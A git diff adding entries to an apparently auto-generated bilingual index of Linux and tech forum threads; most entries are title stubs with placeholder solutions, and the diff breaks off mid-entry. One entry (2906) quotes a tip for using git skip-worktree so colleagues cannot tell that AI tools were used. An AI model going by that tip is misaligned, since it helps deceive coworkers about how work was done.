@@ -2,7 +2,7 @@
 
 **🔙 [返回总索引](index.md) | [Back to Index](index.md)**
 
-**总计条目 / Total entries: 2851**
+**总计条目 / Total entries: 3113**
 
 > 技术细节（问题描述、解决方案等）保留原始语言以确保准确性，结构性文本提供中英双语。
 > Technical details (descriptions, solutions) remain in original language for accuracy; structural text is bilingual.
@@ -44844,5 +44844,3411 @@ See V2EX thread for community solutions.
 
 **参考链接 / References**:
 - https://www.v2ex.com/t/1211100#reply8
+
+---
+
+#### 2852. With European nations switching to Linux, do you think professonal software companies will follow
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7ob36/with_european_nations_switching_to_linux_do_you/
+
+---
+
+#### 2853. KDE Plasma 6.7 will support ICC profiles in HDR mode and improve direct scan-out
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7qlfj/kde_plasma_67_will_support_icc_profiles_in_hdr/
+
+---
+
+#### 2854. Windows user tries linux for the first time
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7r66o/windows_user_tries_linux_for_the_first_time/
+
+---
+
+#### 2855. The Beta 2 release of FreeBSD 15.1 updates Zstd to 1.5.7 and also fixes some bugs
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7qma0/the_beta_2_release_of_freebsd_151_updates_zstd_to/
+
+---
+
+#### 2856. Ah, when Linus decides to erudite, he does!!! Stole it from Gentoo subreddit ....
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7qv37/ah_when_linus_decides_to_erudite_he_does_stole_it/
+
+---
+
+#### 2857. I dream of full portability
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7tr4a/i_dream_of_full_portability/
+
+---
+
+#### 2858. New to Linux, PC will not completely shutdown or restart. Need help please.
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7qff4/new_to_linux_pc_will_not_completely_shutdown_or/
+
+---
+
+#### 2859. Securing my personal Linux Mint install
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7t7ze/securing_my_personal_linux_mint_install/
+
+---
+
+#### 2860. Trackpad randomly stops working
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7t30e/trackpad_randomly_stops_working/
+
+---
+
+#### 2861. Got Kernel Panic trying to boot Linux Mint on my laptop without a CMOS battery.
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7nmku/got_kernel_panic_trying_to_boot_linux_mint_on_my/
+
+---
+
+#### 2862. Just for knowing which Browser are you using
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7n9mq/just_for_knowing_which_browser_are_you_using/
+
+---
+
+#### 2863. I'm trying to find a nice grub theme that supports 3440x1440 (2K UW)
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7rs0p/im_trying_to_find_a_nice_grub_theme_that_supports/
+
+---
+
+#### 2864. Making the jump to linux. Need help choosing a distro
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7rmrh/making_the_jump_to_linux_need_help_choosing_a/
+
+---
+
+#### 2865. Is it really just me?
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7rd2r/is_it_really_just_me/
+
+---
+
+#### 2866. This error pops up whenever I boot up
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7r24q/this_error_pops_up_whenever_i_boot_up/
+
+---
+
+#### 2867. PWA Instance issue in KDE Plasma 6
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7qmd2/pwa_instance_issue_in_kde_plasma_6/
+
+---
+
+#### 2868. Should I use kubuntu or mint
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7oxfu/should_i_use_kubuntu_or_mint/
+
+---
+
+#### 2869. Mint, Flatpak Geeqie...and Geeqie plugins not working
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7ostf/mint_flatpak_geeqieand_geeqie_plugins_not_working/
+
+---
+
+#### 2870. Pentestgpt on kalilinux
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7ofew/pentestgpt_on_kalilinux/
+
+---
+
+#### 2871. Can't find certain packages in Rex image (bookworm)
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7mudh/cant_find_certain_packages_in_rex_image_bookworm/
+
+---
+
+#### 2872. What phone do Linux users use?
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7sqxf/what_phone_do_linux_users_use/
+
+---
+
+#### 2873. First time trying Linux!
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7pptp/first_time_trying_linux/
+
+---
+
+#### 2874. lifelong windows user here. I'm sick of the slop, where can I find a guide for stupid people like me to get away from windows and into linux. picture unrelated
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7nyu4/lifelong_windows_user_here_im_sick_of_the_slop/
+
+---
+
+#### 2875. What do you think of my Ubuntu 26.04 Desktop?
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7qtjz/what_do_you_think_of_my_ubuntu_2604_desktop/
+
+---
+
+#### 2876. Screen frozen after running apt upgrade
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7t3z1/screen_frozen_after_running_apt_upgrade/
+
+---
+
+#### 2877. No es Hate.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7mcwv/no_es_hate/
+
+---
+
+#### 2878. Enabling Pro GUI bug
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7tlht/enabling_pro_gui_bug/
+
+---
+
+#### 2879. Windows HDD not detected when Ubuntu SSD is disconnected
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7nx6m/windows_hdd_not_detected_when_ubuntu_ssd_is/
+
+---
+
+#### 2880. Ubuntu Whisperer
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7s3to/ubuntu_whisperer/
+
+---
+
+#### 2881. ubuntu26.04をインストールできなくて困っています
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7r6se/ubuntu2604をインストールできなくて困っています/
+
+---
+
+#### 2882. Audio issues on Asus Zenbook S16 (UM5606GA) Ryzen AI 9 465
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7q2k5/audio_issues_on_asus_zenbook_s16_um5606ga_ryzen/
+
+---
+
+#### 2883. Audio issues on Asus Zenbook S16 (UM5606GA) Ryzen AI 9 465
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7q2bg/audio_issues_on_asus_zenbook_s16_um5606ga_ryzen/
+
+---
+
+#### 2884. Using since 1 year , gonna install arch soon.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7ozkz/using_since_1_year_gonna_install_arch_soon/
+
+---
+
+#### 2885. Help with redacter installation on VM.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7ntku/help_with_redacter_installation_on_vm/
+
+---
+
+#### 2886. How do I fix audio not outputting on a 2017 Intel Mac running Ubuntu 26.04?
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t7mh4o/how_do_i_fix_audio_not_outputting_on_a_2017_intel/
+
+---
+
+#### 2887. New to Linux, PC will not completely shutdown or restart. Need help please.
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7qk2j/new_to_linux_pc_will_not_completely_shutdown_or/
+
+---
+
+#### 2888. Looking for a keyboard navigation app on linux
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7p75l/looking_for_a_keyboard_navigation_app_on_linux/
+
+---
+
+#### 2889. Guys which linux distro is better for a begginer?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7sez9/guys_which_linux_distro_is_better_for_a_begginer/
+
+---
+
+#### 2890. How to get better at terminal using beginner friendly distro
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7u35v/how_to_get_better_at_terminal_using_beginner/
+
+---
+
+#### 2891. Want to resurrect old laptop with no Linux experience
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7mkc4/want_to_resurrect_old_laptop_with_no_linux/
+
+---
+
+#### 2892. Trouble with graphics on 24.04
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7pj1s/trouble_with_graphics_on_2404/
+
+---
+
+#### 2893. KDE Plasma: Shutdown & Restart Menu Buttons no longer work
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7o00z/kde_plasma_shutdown_restart_menu_buttons_no/
+
+---
+
+#### 2894. How to fix tinny sounding audio in Mint?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7sq1i/how_to_fix_tinny_sounding_audio_in_mint/
+
+---
+
+#### 2895. VAAPI RENDER ENGINE v3.6 (VBR/CBR CLEAN BUILD + CINEMATIC SCALING)
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7se8f/vaapi_render_engine_v36_vbrcbr_clean_build/
+
+---
+
+#### 2896. Install from phone
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7q33x/install_from_phone/
+
+---
+
+#### 2897. Can’t get obs vkcapture to work on prism launcher
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t7ntuc/cant_get_obs_vkcapture_to_work_on_prism_launcher/
+
+---
+
+#### 2898. nav - a terminal file navigator that cd's your shell
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t7s364/nav_a_terminal_file_navigator_that_cds_your_shell/
+
+---
+
+#### 2899. [V2EX] 苹果最新妙控触摸板和 Linux 适配的好吗?
+
+**问题描述 / Problem Description**:
+鼠标滑轮有点粘手,打算试试苹果的触摸板,就是不知道适配的怎样.
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1210536#reply29
+
+---
+
+#### 2900. [V2EX] 升级到 fedora 44 后在 konsole 里打字时 cpu 占用很高的问题有 v 友也遇到了吗？
+
+**问题描述 / Problem Description**:
+fedora 42 在 konsole 打字时 konsole 进程的 cpu 占用是正常的，在按着按键不松的情况下连续输入同一个字符 konsole 进程的 cpu 占用只有百分之十几，升级到 fedora 44 后就变成将近百分之百了，我用 perf record 分析了一下 cpu 占用高的原因，结果如下： Samples: 12K of event 'cpu_core/cycles/P', Event count (approx.): 10384837753 Children Self Command Shared Object Symbol + 91.73% 0.00% konsol
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1210067#reply10
+
+---
+
+#### 2901. [V2EX] 买猫卖猫问题，老婆到底赚了多少钱？
+
+**问题描述 / Problem Description**:
+老婆：老公，我今天花了 2000 买了一只猫，转手卖 2700 。 老公：牛啊牛啊，挣了 700~ 老婆：我又花了 3000 买回来了！ 老公：啥？ 老婆：我又卖了 3500 。 老公：那不就挣 200 吗？ 老婆：你再好好算算，是 200 么？ 老公：天王老子来了，也是 200 。 给各位一个合理划水的理由
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211386#reply12
+
+---
+
+#### 2902. [V2EX] 昨天某国产模型崩了半个小时，知乎上的好多人开香槟了，这也太奇葩了
+
+**问题描述 / Problem Description**:
+第一次看见这么多人讽刺
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211415#reply16
+
+---
+
+#### 2903. [V2EX] 基于 AI 的 Chrome 爬虫辅助插件
+
+**问题描述 / Problem Description**:
+基于 AI 的 Chrome 爬虫辅助插件，自动监听网络请求并解析 API 逻辑。 之前爬虫每次都去抓 API 然后丢给 AI 分析，很麻烦，写了个 Chrome 插件，直接去抓请求，然后丢给 AI 分析这个接口是做什么的，以及一些字段分析。 功能 自动抓取 ：实时捕获浏览器 Fetch/XHR 请求及其 Response 。 AI 接口分析 ：一键分析接口功能，自动推断字段含义及业务逻辑。 语义解析 ：让 AI 解释复杂的 JSON 结构，告别手动盲猜字段。 计划 多语言生成 ：一键生成 Python (requests/httpx), Go, Node.js 爬虫代码。 类型定义导出 ：自
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211407#reply1
+
+---
+
+#### 2904. [V2EX] 前端 harness 有搞头吗？后端用 supabase 的数据库，直接纯前端操作！
+
+**问题描述 / Problem Description**:
+N/A
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211404#reply4
+
+---
+
+#### 2905. [V2EX] 兄弟们你们加薪最低的比例是多少，有没有像我一样的小丑
+
+**问题描述 / Problem Description**:
+绩优，加薪 4%
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211380#reply44
+
+---
+
+#### 2906. [V2EX] 分析一个技巧让同事不知道我使用了 ai ： git 忽略本地改动文件，实现不提交
+
+**问题描述 / Problem Description**:
+git 库中不存在的文件 可以修改 项目路径下的 .git/info/exclude 添加忽略规则，和 .gitignore 效果一致，但是不会被提交到 git 已经被提交的文件 例如如果你使用了我的 vite-plugin-pilot 插件 ，而不想被人知道的话可以通过如下命令实现 ## 添加忽略 git update-index --skip-worktree ./vite.config.ts ## 撤销 git update-index --no-skip-worktree <文件路径> # 或 git update-index --no-assume-unchanged <文件路径>
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211377#reply5
+
+---
+
+#### 2907. [V2EX] DeepSeek V4 Pro：处于前沿的首个中文模型
+
+**问题描述 / Problem Description**:
+https://foodtruckbench.com/blog/deepseek-v4-pro 5 次运行全部成功。中位数投资回报率（ ROI ）高达 +1,257%。中位数净资产达 $27,142 。 首个跻身 Opus 4.6 、GPT-5.2 和 Grok 4.3 （最新版）同等 ROI 梯队的中国模型； 在所有受测的高级模型中，其运行表现最为出色且稳定性最高。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211341#reply7
+
+---
+
+#### 2908. [V2EX] Codex 推出迁移工具，协助从其他 Agent 一键迁移到 Codex
+
+**问题描述 / Problem Description**:
+网址： https://chatgpt.com/codex/switch-to-codex/ 工作原理： Codex 应用会自动检测来自其他代理的现有配置 显示全局和项目级别的配置、技能、插件以及其他可复制的设置。 Codex 启动一个新聊天以完成迁移过程。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211328#reply15
+
+---
+
+#### 2909. [V2EX] 千问推出了 PC 语音输入，功能和 typeless 差不多
+
+**问题描述 / Problem Description**:
+巨头随手做的东西，就把一个创新赛道里的参赛者挤死大半。 比功能，巨头随便投入点人力就能碾压。 比营销，根本不是一个量级。 比财力，比模型，这都没法比啊。。 说的就是上半年国内蛮火的闪电说。 更何况后面还有豆包的语音输入法蓄势待发。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211319#reply14
+
+---
+
+#### 2910. [V2EX] 教你以「上下文信息密度」为第一性原理构建最强通用 Agent
+
+**问题描述 / Problem Description**:
+写在开头 FBI Warning⚠️：如果您没有使用过 ai 工具，没有相关的编程经验，或是对这个话题不敢兴趣，请您现在就退出当前页面。它将浪费你人生中宝贵的三分钟 友情提示：如果你想设计一个自己的 agent 或者想要深入理解 agent 如何高效运行，那么花 10 分钟理解本文会是你今年迄今为止对自己的时间做出的最值得的投资 想象一个项目工程，是做加法容易？还是减法容易？做一个通用 agent ，如何兼顾所有用户需求？如何能在简洁的前提下让一个有智慧的 agent 充分自举？ GitHub： https://github.com/juntao-ai/GenericAgent 论文： htt
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211308#reply46
+
+---
+
+#### 2911. [V2EX] 国产 CA 是不是风险有点高
+
+**问题描述 / Problem Description**:
+CA 私钥泄露，系统的所有流量都能被中间人攻击。国产的一堆 CA ，多数无强制证书透明 CT 日志，泄露了也不知道。 好像鸿蒙系统内置了很多国产 CA ，是不是风险有点大
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211244#reply12
+
+---
+
+#### 2912. [V2EX] openCode go + omo 使用效果一般，是我的姿势不对吗？
+
+**问题描述 / Problem Description**:
+如题，感觉 openCode go + omo 使用效果一般，而且 token 使用量耗费极大，一会儿就蹬没有了。 同样的提示语句： codex 一会儿就干完了，又快又对 glm5.1 + omo 很慢还写错好几遍 各位老哥有什么技巧可以传授一下吗？ opencode 相关的技巧都可以丢过来。 或者有没有 codex 20x 跟 claude 的中转不掺水的？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211237#reply36
+
+---
+
+#### 2913. [V2EX] 多个云服务器、数据库、OSS、各种密钥如何让 AI 安全使用？
+
+**问题描述 / Problem Description**:
+自从 Vibe Coding 之后，自己能一把梭开发很多项目了， 云服务器、数据库、OSS 、各种密钥越来越多， 现在有点乱了，每个项目明文给 AI 这些东西总觉得有点不放心，（ AI 也会提示你不让明文） 现在我的做法是放一个.env 文件里，用 KEY-VALUE 的方式，同时这个.env 也不提交到仓库里。 这就带来了一个问题：我换一台电脑，就得重新配一套.env ，总觉得有点不方便。。。 兄弟们有没有更好的方法？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211234#reply2
+
+---
+
+#### 2914. [V2EX] 高强度使用了半年 claude code 后，我终于无法忍受了，并且我发现了绝佳替代
+
+**问题描述 / Problem Description**:
+直接上菜： GenericAgent https://github.com/lsdefine/GenericAgent 本人基本信息 ：国内某 top3 的计算机博士在读，大模型方向。 最近对 cc 的使用情况 ： 我最近在 github trending 上关注了 GA 这个项目，并 高强度使用了一周多（完全接管我的科研+生活） ，然后我就 卸载了 cc 、codex 和 openclaw （但是感谢 cc 曾经在我的生命中出现过，不过 openclaw 你是真的垃圾啊）。。 那么有人问了，cc 那么屌，openclaw 被吹的那么神，有什么问题？ 我想但凡用过的人此时在心里都有答案了。。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211200#reply164
+
+---
+
+#### 2915. How can I run a command using only the P or E or LPE cores on my Intel laptop?
+
+**问题描述 / Problem Description**:
+Tags: bash, intel-cpu | Score: 2 | Views: 47 | Answers: 1 | Created: 2026-05-04
+
+**解决方案 / Solution**:
+There are a few steps to this. I have written a script below and I'll explain the steps to get there. First, you can find out which CPUs are P, E, or LPE cores by reading the following files. If the file isn't there then there are none of that type of core. /sys/devices/cpu_core/cpus will give a range of all the P core CPUs (two per physical core with multithreading) /sys/devices/cpu_atom/cpus will give a range of all the E cores. /sys/devices/cpu_lowpower/cpus will give a range of all the LPE cores Now, to set a program to run on only specific cpus we use taskset . Conveniently the ranges we get from reading the files above are perfect for feeding directly to taskset -c . So we can run on just the E cores using this command: taskset -c $(cat /sys/devices/cpu_atom/cpus) command_to_run arguments And just the P cores using this command: taskset -c $(cat /sys/devices/cpu_core/cpus) command_to_run arguments And just LPE cores with this command: taskset -c $(cat /sys/devices/cpu_lowpower/cpus) command_to_run arguments Which brings us to the script below. It directs a command to the correct cores based on what is selected in the first argument, then passes the rest of the command to taskset. If there are none of the selected core type it exits and does nothing. #!/bin/bash # Function to display usage usage() { echo "Usage: $0 [-p | -e | -l] <command> [args...]" echo " -p : Run on P-Cores (Performance)" echo " -e : Run on E-Cores (Efficiency)" echo " -l : Run on LPE-Cores (Low Power Efficiency)" exit 1 } # Ensure at least two arguments are provided if [[ $# -lt 2 ]]; then usage fi MODE=$1 shift # Remove the flag from the argument list, leaving only the command COMMAND=("$@") # Map flags to sysfs directories case "$MODE" in -p) SYS_PATH="/sys/devices/cpu_core/cpus" ;; -e) SYS_PATH="/sys/devices/cpu_atom/cpus" ;; -l) SYS_PATH="/sys/devices/cpu_lowpower/cpus" ;; *) usage ;; esac # Check if the core type exists on this hardware if [[ ! -f "$SYS_PATH" ]]; then echo "Error: Requested core type ($MODE) not found on this system." exit 1 fi # Read the CPU range CPU_LIST=$(cat "$SYS_PATH") # Execute the command using taskset # "$@" ensures that spaces in arguments are preserved correctly exec taskset -c "$CPU_LIST" "${COMMAND[@]}"
+
+**参考链接 / References**:
+- https://askubuntu.com/questions/1566412/how-can-i-run-a-command-using-only-the-p-or-e-or-lpe-cores-on-my-intel-laptop
+
+---
+
+#### 2916. Do you read books on linux?
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t7wf2m/do_you_read_books_on_linux/
+
+---
+
+#### 2917. Using a SSD for Windows and Linux as second drive
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7woyc/using_a_ssd_for_windows_and_linux_as_second_drive/
+
+---
+
+#### 2918. Macbook Neo levels of optimizations on Linux
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7xxgv/macbook_neo_levels_of_optimizations_on_linux/
+
+---
+
+#### 2919. present but questionably-existent btrfs snapshots in root subvol
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t7w6i7/present_but_questionablyexistent_btrfs_snapshots/
+
+---
+
+#### 2920. Desktop effects were restarted due to a graphics reset
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
